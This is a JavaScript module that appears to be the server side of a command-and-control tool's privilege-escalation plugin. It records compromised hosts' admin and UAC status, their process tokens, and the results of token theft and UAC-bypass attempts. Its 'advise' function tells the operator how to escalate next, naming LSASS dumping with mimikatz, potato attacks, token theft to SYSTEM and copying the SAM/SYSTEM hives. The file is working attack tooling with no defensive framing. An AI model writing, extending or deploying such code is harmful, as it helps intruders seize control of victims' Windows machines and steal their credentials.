function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS posture (
        client_id TEXT PRIMARY KEY,
        admin INTEGER,
        elevated INTEGER,
        integrity TEXT,
        user TEXT,
        privileges TEXT,
        useful TEXT,
        uac INTEGER,
        techniques TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        pid INTEGER,
        name TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS escalations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        technique TEXT,
        ok INTEGER,
        detail TEXT,
        seen_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS pv_esc ON escalations(client_id)`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "priv") {
      ctx.db.run(
        `INSERT INTO posture (client_id, admin, elevated, integrity, user, privileges, useful, uac, techniques, seen_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(client_id) DO UPDATE SET
           admin = excluded.admin, elevated = excluded.elevated, integrity = excluded.integrity,
           user = excluded.user, privileges = excluded.privileges, useful = excluded.useful,
           uac = excluded.uac, techniques = excluded.techniques, seen_at = excluded.seen_at`,
        clientId, p.admin ? 1 : 0, p.elevated ? 1 : 0, p.integrity || null, p.user || null,
        JSON.stringify(p.privileges || []), JSON.stringify(p.useful || []),
        p.uac ?? -1, JSON.stringify(p.techniques || []), now
      );
      ctx.broadcast("priv", { clientId, ...p });
    } else if (event === "tokens") {
      const list = Array.isArray(p) ? p : [];
      const tx = ctx.db.transaction(() => {
        ctx.db.run(`DELETE FROM tokens WHERE client_id = ?`, clientId);
        const ins = ctx.db.prepare(
          `INSERT INTO tokens (client_id, pid, name, seen_at) VALUES (?, ?, ?, ?)`
        );
        for (const t of list) {
          ins.run(clientId, t.pid || 0, t.name || null, now);
        }
      });
      tx();
      ctx.broadcast("tokens", { clientId, tokens: list });
    } else if (event === "token") {
      ctx.db.run(
        `INSERT INTO escalations (client_id, technique, ok, detail, seen_at) VALUES (?, 'token_theft', ?, ?, ?)`,
        clientId, p.ok ? 1 : 0, p.detail || null, now
      );
      ctx.broadcast("token", { clientId, ...p });
    } else if (event === "uac_bypass") {
      ctx.db.run(
        `INSERT INTO escalations (client_id, technique, ok, detail, seen_at) VALUES (?, 'uac_bypass', ?, ?, ?)`,
        clientId, p.ok ? 1 : 0, p.reason || p.method || null, now
      );
      ctx.broadcast("uac_bypass", { clientId, ...p });
    } else if (event === "escalated") {
      ctx.db.run(
        `INSERT INTO escalations (client_id, technique, ok, detail, seen_at) VALUES (?, 'escalate', ?, ?, ?)`,
        clientId, p.ok ? 1 : 0, p.method || null, now
      );
      ctx.broadcast("escalated", { clientId, ...p });
    } else if (event === "attempt") {
      ctx.broadcast("attempt", { clientId, ...p });
    } else if (event === "uac") {
      ctx.broadcast("uac", { clientId, ...p });
    } else if (event === "exec") {
      ctx.broadcast("exec", { clientId, ...p });
    } else if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    get_posture(ctx, params = {}) {
      const row = ctx.db.query(`SELECT * FROM posture WHERE client_id = ?`).get(params.clientId || "");
      if (!row) return null;
      return {
        admin: !!row.admin,
        elevated: !!row.elevated,
        integrity: row.integrity,
        user: row.user,
        privileges: JSON.parse(row.privileges || "[]"),
        useful: JSON.parse(row.useful || "[]"),
        uac: row.uac,
        techniques: JSON.parse(row.techniques || "[]"),
        at: row.seen_at,
      };
    },

    list_tokens(ctx, params = {}) {
      return ctx.db
        .query(`SELECT pid, name FROM tokens WHERE client_id = ? ORDER BY pid`)
        .all(params.clientId || "");
    },

    list_escalations(ctx, params = {}) {
      return ctx.db
        .query(`SELECT technique, ok, detail, seen_at AS at FROM escalations
                WHERE client_id = ? ORDER BY id DESC LIMIT 100`)
        .all(params.clientId || "")
        .map((r) => ({ ...r, ok: !!r.ok }));
    },

    // Convenience for the operator: what should I do with this host right now?
    advise(ctx, params = {}) {
      const row = ctx.db.query(`SELECT * FROM posture WHERE client_id = ?`).get(params.clientId || "");
      if (!row) return { advice: ["run recon first"] };

      const advice = [];
      const elevated = !!row.elevated;
      const admin = !!row.admin;
      const privs = JSON.parse(row.privileges || "[]");

      if (elevated) {
        advice.push("already elevated — go straight to mimik to dump LSASS");
        advice.push("SeDebugPrivilege usually present at this level: token theft can reach SYSTEM");
      } else if (admin) {
        advice.push("in Administrators but not elevated — try a UAC bypass");
      } else {
        advice.push("standard user — look for a service account or scheduled task");
        if (privs.includes("SeImpersonatePrivilege")) {
          advice.push("SeImpersonate is present: a potato attack is the path");
        }
      }

      if (privs.includes("SeBackupPrivilege")) {
        advice.push("SeBackup: you can copy the SAM/SYSTEM hives directly");
      }
      if (row.uac === 5 || row.uac === 4) {
        advice.push("UAC consent level is bypassable (auto-elevate binaries apply)");
      } else if (row.uac === 0) {
        advice.push("UAC is off — elevation needs no bypass at all");
      }

      return { advice };
    },
  },
};
